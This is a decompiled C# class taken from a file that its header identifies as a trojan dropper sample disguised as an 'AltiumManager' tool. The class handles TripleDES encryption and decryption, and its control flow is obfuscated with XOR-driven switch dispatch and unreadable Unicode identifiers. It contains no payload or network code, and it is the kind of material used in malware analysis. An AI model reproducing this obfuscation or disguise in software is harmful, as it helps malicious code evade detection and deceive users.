// Decompiled with JetBrains decompiler
// Type: AltiumManager.Simple3Des
// Assembly: LeOcHwILpefYMF8, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A7C159C0-2645-0515-18CC-33AA0158F2C6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-949b68beab7b82f9c18962df03d52a02a963263103606c758f668476868a1381.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace AltiumManager
{
  public sealed class Simple3Des
  {
    private TripleDESCryptoServiceProvider TripleDes;

    private byte[] \uF0F9\uF58C\uF445\uE7D9\uF315\uF186\uE9E5\uE6C0\uF5D3\uE638\uF87C\uF2B4(
      string _param1,
      int _param2)
    {
label_4:
      int num1 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(101);
      int num2 = -61;
      byte[] numArray;
      while (true)
      {
        switch ((num2 ^ 101) + 93)
        {
          case 0:
            goto label_4;
          case 1:
            byte[] arySrc;
            SHA1CryptoServiceProvider cryptoServiceProvider;
            byte[] bytes;
            switch (num1 + 93)
            {
              case 0:
                arySrc = (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (_param2 - 1 + 1)]);
                num1 = -64;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.decryptData);
                num1 = -61;
                goto label_1;
              case 2:
                arySrc = cryptoServiceProvider.ComputeHash(bytes);
                num1 = -60;
                goto label_1;
              case 3:
              case 7:
                goto label_14;
              case 4:
                numArray = arySrc;
                num1 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(98);
                goto label_1;
              case 5:
                bytes = Encoding.Unicode.GetBytes(_param1);
                num1 = -62;
                goto label_1;
              case 6:
                cryptoServiceProvider = new SHA1CryptoServiceProvider();
                num1 = -49;
                goto label_1;
              default:
                num2 = AltiumDatabaseDataSet.UsersDataTable.\uE23F\uE7C9\uEE0F\uE7EA\uED41\uE818\uECBF\uEA9A\uF708\uE0CF\uE6D6\uEB0D(108);
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.\u002Ector);
            num2 = -64;
            continue;
          case 3:
label_1:
            num1 ^= 103;
            break;
        }
        num2 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(98);
      }
label_14:
      return numArray;
    }

    public Simple3Des(string key)
    {
label_4:
      int num1 = 0;
      int num2 = 3;
      while (true)
      {
        switch (num2 ^ 105)
        {
          case 103:
            goto label_4;
          case 104:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.encryptData);
            num2 = 1;
            continue;
          case 105:
            switch (num1)
            {
              case 99:
                num1 = 2;
                goto label_1;
              case 100:
                this.TripleDes.IV = this.\uF0F9\uF58C\uF445\uE7D9\uF315\uF186\uE9E5\uE6C0\uF5D3\uE638\uF87C\uF2B4("", this.TripleDes.BlockSize / 8);
                num1 = 3;
                goto label_1;
              case 101:
                num1 = 15;
                goto label_1;
              case 102:
                this.TripleDes = new TripleDESCryptoServiceProvider();
                num1 = 14;
                goto label_1;
              case 103:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.decryptData);
                num1 = 1;
                goto label_1;
              case 104:
                this.TripleDes.Key = this.\uF0F9\uF58C\uF445\uE7D9\uF315\uF186\uE9E5\uE6C0\uF5D3\uE638\uF87C\uF2B4(key, this.TripleDes.KeySize / 8);
                num1 = 5;
                goto label_1;
              case 105:
                goto label_14;
              default:
                num2 = 14;
                continue;
            }
          case 106:
label_1:
            num1 ^= 102;
            break;
        }
        num2 = 0;
      }
label_14:;
    }

    public string encryptData(string plaintext)
    {
label_4:
      int num1 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F7(67);
      int num2 = AltiumDatabaseDataSet.\uF5B4\uEBB6\uED16\uE0FF\uE59B\uF026\uEFAB\uE051\uE189\uE10C\uF7F9\uF6D6(73);
      string base64String;
      while (true)
      {
        switch ((num2 ^ 106) + 104)
        {
          case 0:
            goto label_4;
          case 1:
            byte[] bytes;
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            switch (num1 + 101)
            {
              case 0:
                bytes = Encoding.Unicode.GetBytes(plaintext);
                num1 = -58;
                goto label_1;
              case 1:
                num1 = -62;
                goto label_1;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.\u002Ector);
                num1 = -5;
                goto label_1;
              case 3:
              case 10:
                goto label_17;
              case 4:
                base64String = Convert.ToBase64String(memoryStream.ToArray());
                num1 = -8;
                goto label_1;
              case 5:
                memoryStream = new MemoryStream();
                num1 = -59;
                goto label_1;
              case 6:
                cryptoStream.Write(bytes, 0, bytes.Length);
                num1 = -6;
                goto label_1;
              case 7:
                num1 = AltiumDatabaseDataSet.\uF5B4\uEBB6\uED16\uE0FF\uE59B\uF026\uEFAB\uE051\uE189\uE10C\uF7F9\uF6D6(53);
                goto label_1;
              case 8:
                cryptoStream = new CryptoStream((Stream) memoryStream, this.TripleDes.CreateEncryptor(), CryptoStreamMode.Write);
                num1 = -57;
                goto label_1;
              case 9:
                cryptoStream.FlushFinalBlock();
                num1 = -60;
                goto label_1;
              default:
                num2 = -14;
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.encryptData);
            num2 = -16;
            continue;
          case 3:
label_1:
            num1 ^= 102;
            break;
        }
        num2 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F8(74);
      }
label_17:
      return base64String;
    }

    public string decryptData(string encryptedText)
    {
label_6:
      int num1 = 52;
      int num2 = -15;
      string str;
      while (true)
      {
        switch ((num2 ^ 102) + 108)
        {
          case 0:
            CryptoStream cryptoStream;
            MemoryStream memoryStream;
            byte[] buffer;
            switch (num1)
            {
              case 92:
                cryptoStream.FlushFinalBlock();
                num1 = 8;
                goto label_1;
              case 93:
                cryptoStream = new CryptoStream((Stream) memoryStream, this.TripleDes.CreateDecryptor(), CryptoStreamMode.Write);
                num1 = 14;
                goto label_1;
              case 94:
                str = Encoding.Unicode.GetString(memoryStream.ToArray());
                num1 = 9;
                goto label_1;
              case 95:
                buffer = Convert.FromBase64String(encryptedText);
                num1 = 11;
                goto label_1;
              case 96:
                memoryStream = new MemoryStream();
                num1 = 54;
                goto label_1;
              case 97:
                num1 = 55;
                goto label_1;
              case 98:
              case 102:
                goto label_17;
              case 99:
                num1 = 53;
                goto label_1;
              case 100:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Simple3Des.decryptData);
                num1 = 15;
                goto label_1;
              case 101:
                cryptoStream.Write(buffer, 0, buffer.Length);
                num1 = 10;
                goto label_1;
              default:
                num2 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F8(74);
                continue;
            }
          case 1:
            goto label_6;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Simple3Des.\u002Ector);
            num2 = -16;
            continue;
          case 3:
label_1:
            num1 ^= 107;
            break;
        }
        num2 = AltiumDatabaseDataSet.\uF5B4\uEBB6\uED16\uE0FF\uE59B\uF026\uEFAB\uE051\uE189\uE10C\uF7F9\uF6D6(60);
      }
label_17:
      return str;
    }
  }
}
